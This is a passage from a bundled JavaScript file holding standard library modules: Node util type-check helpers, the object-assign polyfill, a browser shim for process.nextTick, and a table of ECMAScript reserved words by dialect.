exports.isNullOrUndefined = isNullOrUndefined;

function isNumber(arg) {
  return typeof arg === 'number';
}
exports.isNumber = isNumber;

function isString(arg) {
  return typeof arg === 'string';
}
exports.isString = isString;

function isSymbol(arg) {
  return typeof arg === 'symbol';
}
exports.isSymbol = isSymbol;

function isUndefined(arg) {
  return arg === void 0;
}
exports.isUndefined = isUndefined;

function isRegExp(re) {
  return isObject(re) && objectToString(re) === '[object RegExp]';
}
exports.isRegExp = isRegExp;

function isObject(arg) {
  return typeof arg === 'object' && arg !== null;
}
exports.isObject = isObject;

function isDate(d) {
  return isObject(d) && objectToString(d) === '[object Date]';
}
exports.isDate = isDate;

function isError(e) {
  return isObject(e) &&
      (objectToString(e) === '[object Error]' || e instanceof Error);
}
exports.isError = isError;

function isFunction(arg) {
  return typeof arg === 'function';
}
exports.isFunction = isFunction;

function isPrimitive(arg) {
  return arg === null ||
         typeof arg === 'boolean' ||
         typeof arg === 'number' ||
         typeof arg === 'string' ||
         typeof arg === 'symbol' ||  // ES6 symbol
         typeof arg === 'undefined';
}
exports.isPrimitive = isPrimitive;

exports.isBuffer = require('./support/isBuffer');

function objectToString(o) {
  return Object.prototype.toString.call(o);
}


function pad(n) {
  return n < 10 ? '0' + n.toString(10) : n.toString(10);
}


var months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep',
              'Oct', 'Nov', 'Dec'];

// 26 Feb 16:19:34
function timestamp() {
  var d = new Date();
  var time = [pad(d.getHours()),
              pad(d.getMinutes()),
              pad(d.getSeconds())].join(':');
  return [d.getDate(), months[d.getMonth()], time].join(' ');
}


// log is just a thin wrapper to console.log that prepends a timestamp
exports.log = function() {
  console.log('%s - %s', timestamp(), exports.format.apply(exports, arguments));
};


/**
 * Inherit the prototype methods from one constructor into another.
 *
 * The Function.prototype.inherits from lang.js rewritten as a standalone
 * function (not on Function.prototype). NOTE: If this file is to be loaded
 * during bootstrapping this function needs to be rewritten using some native
 * functions as prototype setup using normal JavaScript does not work as
 * expected during bootstrapping (see mirror.js in r114903).
 *
 * @param {function} ctor Constructor function which needs to inherit the
 *     prototype.
 * @param {function} superCtor Constructor function to inherit prototype from.
 */
exports.inherits = require('inherits');

exports._extend = function(origin, add) {
  // Don't do anything if add isn't an object
  if (!add || !isObject(add)) return origin;

  var keys = Object.keys(add);
  var i = keys.length;
  while (i--) {
    origin[keys[i]] = add[keys[i]];
  }
  return origin;
};

function hasOwnProperty(obj, prop) {
  return Object.prototype.hasOwnProperty.call(obj, prop);
}

}).call(this,require('_process'),typeof global !== "undefined" ? global : typeof self !== "undefined" ? self : typeof window !== "undefined" ? window : {})

},{"./support/isBuffer":23,"_process":26,"inherits":22}],25:[function(require,module,exports){
/*
object-assign
(c) Sindre Sorhus
@license MIT
*/

'use strict';
/* eslint-disable no-unused-vars */
var getOwnPropertySymbols = Object.getOwnPropertySymbols;
var hasOwnProperty = Object.prototype.hasOwnProperty;
var propIsEnumerable = Object.prototype.propertyIsEnumerable;

function toObject(val) {
	if (val === null || val === undefined) {
		throw new TypeError('Object.assign cannot be called with null or undefined');
	}

	return Object(val);
}

function shouldUseNative() {
	try {
		if (!Object.assign) {
			return false;
		}

		// Detect buggy property enumeration order in older V8 versions.

		// https://bugs.chromium.org/p/v8/issues/detail?id=4118
		var test1 = new String('abc');  // eslint-disable-line no-new-wrappers
		test1[5] = 'de';
		if (Object.getOwnPropertyNames(test1)[0] === '5') {
			return false;
		}

		// https://bugs.chromium.org/p/v8/issues/detail?id=3056
		var test2 = {};
		for (var i = 0; i < 10; i++) {
			test2['_' + String.fromCharCode(i)] = i;
		}
		var order2 = Object.getOwnPropertyNames(test2).map(function (n) {
			return test2[n];
		});
		if (order2.join('') !== '0123456789') {
			return false;
		}

		// https://bugs.chromium.org/p/v8/issues/detail?id=3056
		var test3 = {};
		'abcdefghijklmnopqrst'.split('').forEach(function (letter) {
			test3[letter] = letter;
		});
		if (Object.keys(Object.assign({}, test3)).join('') !==
				'abcdefghijklmnopqrst') {
			return false;
		}

		return true;
	} catch (err) {
		// We don't expect any of the above to throw, but better to be safe.
		return false;
	}
}

module.exports = shouldUseNative() ? Object.assign : function (target, source) {
	var from;
	var to = toObject(target);
	var symbols;

	for (var s = 1; s < arguments.length; s++) {
		from = Object(arguments[s]);

		for (var key in from) {
			if (hasOwnProperty.call(from, key)) {
				to[key] = from[key];
			}
		}

		if (getOwnPropertySymbols) {
			symbols = getOwnPropertySymbols(from);
			for (var i = 0; i < symbols.length; i++) {
				if (propIsEnumerable.call(from, symbols[i])) {
					to[symbols[i]] = from[symbols[i]];
				}
			}
		}
	}

	return to;
};

},{}],26:[function(require,module,exports){
// shim for using process in browser
var process = module.exports = {};

// cached from whatever global is present so that test runners that stub it
// don't break things.  But we need to wrap it in a try catch in case it is
// wrapped in strict mode code which doesn't define any globals.  It's inside a
// function because try/catches deoptimize in certain engines.

var cachedSetTimeout;
var cachedClearTimeout;

function defaultSetTimout() {
    throw new Error('setTimeout has not been defined');
}
function defaultClearTimeout () {
    throw new Error('clearTimeout has not been defined');
}
(function () {
    try {
        if (typeof setTimeout === 'function') {
            cachedSetTimeout = setTimeout;
        } else {
            cachedSetTimeout = defaultSetTimout;
        }
    } catch (e) {
        cachedSetTimeout = defaultSetTimout;
    }
    try {
        if (typeof clearTimeout === 'function') {
            cachedClearTimeout = clearTimeout;
        } else {
            cachedClearTimeout = defaultClearTimeout;
        }
    } catch (e) {
        cachedClearTimeout = defaultClearTimeout;
    }
} ())
function runTimeout(fun) {
    if (cachedSetTimeout === setTimeout) {
        //normal enviroments in sane situations
        return setTimeout(fun, 0);
    }
    // if setTimeout wasn't available but was latter defined
    if ((cachedSetTimeout === defaultSetTimout || !cachedSetTimeout) && setTimeout) {
        cachedSetTimeout = setTimeout;
        return setTimeout(fun, 0);
    }
    try {
        // when when somebody has screwed with setTimeout but no I.E. maddness
        return cachedSetTimeout(fun, 0);
    } catch(e){
        try {
            // When we are in I.E. but the script has been evaled so I.E. doesn't trust the global object when called normally
            return cachedSetTimeout.call(null, fun, 0);
        } catch(e){
            // same as above but when it's a version of I.E. that must have the global object for 'this', hopfully our context correct otherwise it will throw a global error
            return cachedSetTimeout.call(this, fun, 0);
        }
    }


}
function runClearTimeout(marker) {
    if (cachedClearTimeout === clearTimeout) {
        //normal enviroments in sane situations
        return clearTimeout(marker);
    }
    // if clearTimeout wasn't available but was latter defined
    if ((cachedClearTimeout === defaultClearTimeout || !cachedClearTimeout) && clearTimeout) {
        cachedClearTimeout = clearTimeout;
        return clearTimeout(marker);
    }
    try {
        // when when somebody has screwed with setTimeout but no I.E. maddness
        return cachedClearTimeout(marker);
    } catch (e){
        try {
            // When we are in I.E. but the script has been evaled so I.E. doesn't  trust the global object when called normally
            return cachedClearTimeout.call(null, marker);
        } catch (e){
            // same as above but when it's a version of I.E. that must have the global object for 'this', hopfully our context correct otherwise it will throw a global error.
            // Some versions of I.E. have different rules for clearTimeout vs setTimeout
            return cachedClearTimeout.call(this, marker);
        }
    }



}
var queue = [];
var draining = false;
var currentQueue;
var queueIndex = -1;

function cleanUpNextTick() {
    if (!draining || !currentQueue) {
        return;
    }
    draining = false;
    if (currentQueue.length) {
        queue = currentQueue.concat(queue);
    } else {
        queueIndex = -1;
    }
    if (queue.length) {
        drainQueue();
    }
}

function drainQueue() {
    if (draining) {
        return;
    }
    var timeout = runTimeout(cleanUpNextTick);
    draining = true;

    var len = queue.length;
    while(len) {
        currentQueue = queue;
        queue = [];
        while (++queueIndex < len) {
            if (currentQueue) {
                currentQueue[queueIndex].run();
            }
        }
        queueIndex = -1;
        len = queue.length;
    }
    currentQueue = null;
    draining = false;
    runClearTimeout(timeout);
}

process.nextTick = function (fun) {
    var args = new Array(arguments.length - 1);
    if (arguments.length > 1) {
        for (var i = 1; i < arguments.length; i++) {
            args[i - 1] = arguments[i];
        }
    }
    queue.push(new Item(fun, args));
    if (queue.length === 1 && !draining) {
        runTimeout(drainQueue);
    }
};

// v8 likes predictible objects
function Item(fun, array) {
    this.fun = fun;
    this.array = array;
}
Item.prototype.run = function () {
    this.fun.apply(null, this.array);
};
process.title = 'browser';
process.browser = true;
process.env = {};
process.argv = [];
process.version = ''; // empty string to avoid regexp issues
process.versions = {};

function noop() {}

process.on = noop;
process.addListener = noop;
process.once = noop;
process.off = noop;
process.removeListener = noop;
process.removeAllListeners = noop;
process.emit = noop;
process.prependListener = noop;
process.prependOnceListener = noop;

process.listeners = function (name) { return [] }

process.binding = function (name) {
    throw new Error('process.binding is not supported');
};

process.cwd = function () { return '/' };
process.chdir = function (dir) {
    throw new Error('process.chdir is not supported');
};
process.umask = function() { return 0; };

},{}],27:[function(require,module,exports){
module.exports = require('./reserved-words');

},{"./reserved-words":28}],28:[function(require,module,exports){
var assert = require('assert');

/**
 * Structure for storing keywords.
 *
 * @typedef {Object.<String,Boolean>} KeywordsHash
 */

/**
 * ECMAScript dialects.
 *
 * @const
 * @type {Object.<String,Number|String>} - keys as readable names and values as versions
 */
var DIALECTS = {
    es3: 3,
    es5: 5,
    es2015: 6,
    es7: 7,

    // aliases
    es6: 6,
    'default': 5,
    next: 6
};

/**
 * ECMAScript reserved words.
 *
 * @type {Object.<String,KeywordsHash>}
 */
var KEYWORDS = exports.KEYWORDS = {};

/**
 * Check word for being an reserved word.
 *
 * @param {String} word - word to check
 * @param {String|Number} [dialect] - dialect or version
 * @param {Boolean} [strict] - strict mode
 * @returns {?Boolean}
 */
exports.check = function check(word, dialect, strict) {
    dialect = dialect || DIALECTS.default;
    var version = DIALECTS[dialect] || dialect;

    if (strict && version >= 5) {
        version += '-strict';
    }

    assert(KEYWORDS[version], 'Unknown dialect');

    return KEYWORDS[version].hasOwnProperty(word);
};

/**
 * Reserved Words for ES3
 *
 * ECMA-262 3rd: 7.5.1
 * http://www.ecma-international.org/publications/files/ECMA-ST-ARCH/ECMA-262,%203rd%20edition,%20December%201999.pdf
 *
 * @type {KeywordsHash}
 */
KEYWORDS['3'] = _hash(
    // Keyword, ECMA-262 3rd: 7.5.2
    'break    else       new     var',
    'case     finally    return  void',
    'catch    for        switch  while',
    'continue function   this    with',
    'default  if         throw',
    'delete   in         try',
    'do       instanceof typeof',
    // FutureReservedWord, ECMA-262 3rd 7.5.3
    'abstract enum       int        short',
    'boolean  export     interface  static',
    'byte     extends    long       super',
    'char     final      native     synchronized',
    'class    float      package    throws',
    'const    goto       private    transient',
    'debugger implements protected  volatile',
    'double   import     public',
    // NullLiteral & BooleanLiteral
    'null true false'
);

/**
 * Reserved Words for ES5.
 *
 * http://es5.github.io/#x7.6.1
 *
 * @type {KeywordsHash}
 */
KEYWORDS['5'] = _hash(
    // Keyword
    'break    do       instanceof typeof',
    'case     else     new        var',
    'catch    finally  return     void',
    'continue for      switch     while',
    'debugger function this       with',
    'default  if       throw',
    'delete   in       try',
    // FutureReservedWord
    'class enum extends super',
    'const export import',
    // NullLiteral & BooleanLiteral
    'null true false'
);

/**
 * Reserved Words for ES5 in strict mode.
 *
 * @type {KeywordsHash}
 */
KEYWORDS['5-strict'] = _hash(
    KEYWORDS['5'],
    // FutureReservedWord, strict mode. http://es5.github.io/#x7.6.1.2
    'implements let     private   public yield',
    'interface  package protected static'
);

/**
 * Reserved Words for ES6.
 *
 * 11.6.2
 * http://www.ecma-international.org/ecma-262/6.0/index.html#sec-reserved-words
 *
 * @type {KeywordsHash}
 */
KEYWORDS['6'] = _hash(
    // Keywords, ES6 11.6.2.1, http://www.ecma-international.org/ecma-262/6.0/index.html#sec-keywords
    'break    do       in         typeof',
    'case     else     instanceof var',
    'catch    export   new        void',
    'class    extends  return     while',
    'const    finally  super      with',
    'continue for      switch     yield',
    'debugger function this',
    'default  if       throw',
    'delete   import   try',
    // Future Reserved Words, ES6 11.6.2.2
    // http://www.ecma-international.org/ecma-262/6.0/index.html#sec-future-reserved-words
    'enum await',
    // NullLiteral & BooleanLiteral
    'null true false'
);

/**
 * Reserved Words for ES6 in strict mode.
 *
 * @type {KeywordsHash}
 */
KEYWORDS['6-strict'] = _hash(
    KEYWORDS['6'],
    // Keywords, ES6 11.6.2.1
    'let static',
    // Future Reserved Words, ES6 11.6.2.2
    'implements package protected',
    'interface private public'
);

/**
 * Generates hash from strings
 *
 * @private
 * @param {...String|KeywordsHash} keywords - Space-delimited string or previous result of _hash
 * @return {KeywordsHash} - Object with keywords in keys and true in values
 */
function _hash() {
    var set = Array.prototype.map.call(arguments, function(v) {
        return typeof v === 'string' ? v : Object.keys(v).join(' ');
    }).join(' ');

    return set.split(/\s+/)
        .reduce(function(res, keyword) {
            res[keyword] = true;
            return res;
        }, {});
}

},{"assert":21}]},{},[11])
//# sourceMappingURL=sourcemap
